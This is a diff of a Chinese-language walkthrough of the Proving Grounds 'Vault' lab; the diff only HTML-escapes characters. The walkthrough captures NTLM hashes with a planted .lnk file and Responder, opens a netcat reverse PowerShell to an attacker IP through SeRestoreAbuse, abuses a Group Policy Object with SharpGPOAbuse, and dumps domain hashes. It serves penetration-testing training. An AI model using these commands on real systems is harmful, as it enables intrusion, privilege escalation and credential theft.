@@ -90,7 +90,7 @@ SMB匿名访问
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
-└─$ smbclient -L //192.168.202.172/ -U ''                       
+└─$ smbclient -L //192.168.202.172/ -U &#39;&#39;                       
 Password for [WORKGROUP\]:
 
         Sharename       Type      Comment
@@ -108,10 +108,10 @@ Unable to connect with SMB1 -- no workgroup available
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault]
-└─$ crackmapexec smb 192.168.202.172 -u 'guest' -p '' --shares 
+└─$ crackmapexec smb 192.168.202.172 -u &#39;guest&#39; -p &#39;&#39; --shares 
 SMB         192.168.202.172 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
-SMB         192.168.202.172 445    DC               [+] vault.offsec\guest: 
-SMB         192.168.202.172 445    DC               [+] Enumerated shares
+SMB         192.168.202.172 445    DC               [&#43;] vault.offsec\guest: 
+SMB         192.168.202.172 445    DC               [&#43;] Enumerated shares
 SMB         192.168.202.172 445    DC               Share           Permissions     Remark
 SMB         192.168.202.172 445    DC               -----           -----------     ------
 SMB         192.168.202.172 445    DC               ADMIN$                          Remote Admin
@@ -139,10 +139,10 @@ Generation Complete.
 
 ```sh
 ──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault]
-└─$ smbclient //192.168.202.172/DocumentsShare -U ''
+└─$ smbclient //192.168.202.172/DocumentsShare -U &#39;&#39;
 Password for [WORKGROUP\]:
-Try "help" to get a list of possible commands.
-smb: \> put test.lnk 
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; put test.lnk 
 putting file test.lnk as \test.lnk (3.3 kb/s) (average 3.3 kb/s)
 ```
 
@@ -153,7 +153,7 @@ putting file test.lnk as \test.lnk (3.3 kb/s) (average 3.3 kb/s)
 └─$ sudo responder -I tun0
 ……
 
-[+] Listening for events...                                                                                 
+[&#43;] Listening for events...                                                                                 
 
 [SMB] NTLMv2-SSP Client   : 192.168.202.172
 [SMB] NTLMv2-SSP Username : VAULT\anirudh
@@ -178,8 +178,8 @@ ANIRUDH::VAULT:b016c3bc0a2a9b1c:8b6874393aea8cc736beaa79e7e1d231:010100000000000
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault]
 └─$ evil-winrm -u anirudh -p SecureHM -i 192.168.202.172
 ……
-*Evil-WinRM* PS C:\Users\anirudh\Documents>
-*Evil-WinRM* PS C:\Users\anirudh\Documents> type C:\Users\anirudh\Desktop\local.txt
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt;
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; type C:\Users\anirudh\Desktop\local.txt
 6379a394e97f465833bd2a2d72fe5d56
 ```
 
@@ -190,7 +190,7 @@ ANIRUDH::VAULT:b016c3bc0a2a9b1c:8b6874393aea8cc736beaa79e7e1d231:010100000000000
 检查当前用户权限，发现权限有很多：
 
 ```sh
-*Evil-WinRM* PS C:\Users\anirudh\Documents> whoami /priv
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -217,16 +217,16 @@ SeTimeZonePrivilege           Change the time zone                Enabled
 上传SeRestoreAbuse 和nc
 
 ```sh
-*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SeRestoreAbuse.exe
-*Evil-WinRM* PS C:\Users\anirudh\Documents> upload nc64.exe
-*Evil-WinRM* PS C:\Users\anirudh\Documents> mkdir C:\tmp\
-*Evil-WinRM* PS C:\Users\anirudh\Documents> copy nc64.exe C:\tmp\nc.exe
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; upload SeRestoreAbuse.exe
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; upload nc64.exe
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; mkdir C:\tmp\
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; copy nc64.exe C:\tmp\nc.exe
 ```
 
 执行 SeRestoreAbuse 利用脚本
 
 ```sh
-*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SeRestoreAbuse.exe "C:\tmp\nc.exe 192.168.45.248 4444 -e powershell"
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; ./SeRestoreAbuse.exe &#34;C:\tmp\nc.exe 192.168.45.248 4444 -e powershell&#34;
 RegCreateKeyExA result: 0
 RegSetValueExA result: 0
 
@@ -242,7 +242,7 @@ connect to [192.168.45.248] from (UNKNOWN) [192.168.202.172] 51849
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> C:\tmp\nc.exe 192.168.45.248 5555 -e powershell
+PS C:\Windows\system32&gt; C:\tmp\nc.exe 192.168.45.248 5555 -e powershell
 C:\tmp\nc.exe 192.168.45.248 5555 -e powershell
 ```
 
@@ -256,10 +256,10 @@ connect to [192.168.45.248] from (UNKNOWN) [192.168.202.172] 51852
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> whoami
+PS C:\Windows\system32&gt; whoami
 whoami
 nt authority\system
-PS C:\Windows\system32> type C:\users\administrator\desktop\proof.txt
+PS C:\Windows\system32&gt; type C:\users\administrator\desktop\proof.txt
 type C:\users\administrator\desktop\proof.txt
 12ef329cf77b22fb67e52b389022be6d
 
@@ -268,7 +268,7 @@ type C:\users\administrator\desktop\proof.txt
 
 
 ```sh
-./SeRestoreAbuse.exe "C:\tmp\nc.exe 192.168.45.248 4444 -e powershell"
+./SeRestoreAbuse.exe &#34;C:\tmp\nc.exe 192.168.45.248 4444 -e powershell&#34;
 
 C:\tmp\nc.exe 192.168.45.248 5555 -e powershell
 ```
@@ -293,7 +293,7 @@ C:\tmp\nc.exe 192.168.45.248 5555 -e powershell
 接下来, 使用Evil-WinRM 和 -s 参数重新连接，以便访问当前目录中的 PowerShell 脚本。
 
 ```
-*Evil-WinRM* PS C:\Users\anirudh\Documents> exit
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; exit
 
 Info: Exiting with code 0
 
@@ -303,8 +303,8 @@ Info: Exiting with code 0
 
 ……
 
-*Evil-WinRM* PS C:\Users\anirudh\Documents> 
-*Evil-WinRM* PS C:\Users\anirudh\Documents> PowerView.ps1
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; 
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; PowerView.ps1
 ```
 
 组策略枚举
@@ -312,8 +312,8 @@ Info: Exiting with code 0
 使用  `Get-NetGPO` 列出 GPOs（Group Policy Objects），获取GUID
 
 ```
-*Evil-WinRM* PS C:\Users\anirudh\Documents> PowerView.ps1
-*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; PowerView.ps1
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; Get-NetGPO
 
 
 usncreated               : 5672
@@ -365,7 +365,7 @@ objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,
 使用 Get-GPPermission 检查默认组策略（Default Group Policy）的权限。
 
 ```
-*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
 
 
 Trustee     : anirudh
@@ -387,7 +387,7 @@ Inherited   : False
 上传到目标主机
 
 ```sh
-*Evil-WinRM* PS C:\Users\anirudh\Documents> upload SharpGPOAbuse.exe
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; upload SharpGPOAbuse.exe
 Info: Uploading SharpGPOAbuse.exe to C:\Users\anirudh\Documents\SharpGPOAbuse.exe
 
                                                              
@@ -400,24 +400,24 @@ Info: Upload successful!
 执行 SharpGPOAbuse.exe，将anirudh用户帐户添加到本地管理员组，传递用户名，并传递我们具有写入权限的组策略。
 
 ```
-*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
-[+] Domain = vault.offsec
-[+] Domain Controller = DC.vault.offsec
-[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
-[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
-[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
-[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
-[+] The GPO does not specify any group memberships.
-[+] versionNumber attribute changed successfully
-[+] The version number in GPT.ini was increased successfully.
-[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
-[+] Done!
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName &#34;Default Domain Policy&#34;
+[&#43;] Domain = vault.offsec
+[&#43;] Domain Controller = DC.vault.offsec
+[&#43;] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
+[&#43;] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
+[&#43;] GUID of &#34;Default Domain Policy&#34; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[&#43;] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[&#43;] The GPO does not specify any group memberships.
+[&#43;] versionNumber attribute changed successfully
+[&#43;] The version number in GPT.ini was increased successfully.
+[&#43;] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[&#43;] Done!
 ```
 
 更新本地组策略
 
 ```
-*Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; gpupdate /force
 Updating policy...
 
 Computer Policy update has completed successfully.
@@ -428,7 +428,7 @@ User Policy update has completed successfully.
 验证当前用户是否成功添加到本地管理员组
 
 ```
-*Evil-WinRM* PS C:\Users\anirudh\Documents> net localgroup administrators
+*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; net localgroup administrators
 Alias name     administrators
 Comment        Administrators have complete and unrestricted access to the computer/domain
 
@@ -444,7 +444,7 @@ The command completed successfully.
 
 ```
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault]
-└─$ xfreerdp /u:anirudh /p:'SecureHM' /v:192.168.202.172 /sec:nla /dynamic-resolution +clipboard /drive:share,/home/xavier/project/ /tls-seclevel:0
+└─$ xfreerdp /u:anirudh /p:&#39;SecureHM&#39; /v:192.168.202.172 /sec:nla /dynamic-resolution &#43;clipboard /drive:share,/home/xavier/project/ /tls-seclevel:0
 ```
 
 ![image-20240209230516809](resource/23-W-H-Vault.assets/image-20240209230516809.png)
@@ -468,10 +468,10 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 Microsoft Windows [Version 10.0.17763.2300]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
-C:\Windows\system32> whoami
+C:\Windows\system32&gt; whoami
 nt authority\system
 
-C:\Windows\system32> type C:\users\administrator\desktop\proof.txt
+C:\Windows\system32&gt; type C:\users\administrator\desktop\proof.txt
 12ef329cf77b22fb67e52b389022be6d
 
 ```
@@ -490,7 +490,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn&#39;t have hash information.
 [*] Dumping cached domain logon information (domain/username:hash)
 [*] Dumping LSA Secrets
 [*] $MACHINE.ACC 
@@ -522,13 +522,13 @@ Data: For more information, check Evil-WinRM Github: https://github.com/Hackplay
 
 Info: Establishing connection to remote endpoint
 
-*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
 vault\administrator
-*Evil-WinRM* PS C:\Users\Administrator\Documents> net user administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; net user administrator
 User name                    Administrator
 Full Name
 Comment                      Built-in account for administering the computer/domain
-User's comment
+User&#39;s comment
 Country/region code          000 (System Default)
 Account active               Yes
 Account expires              Never
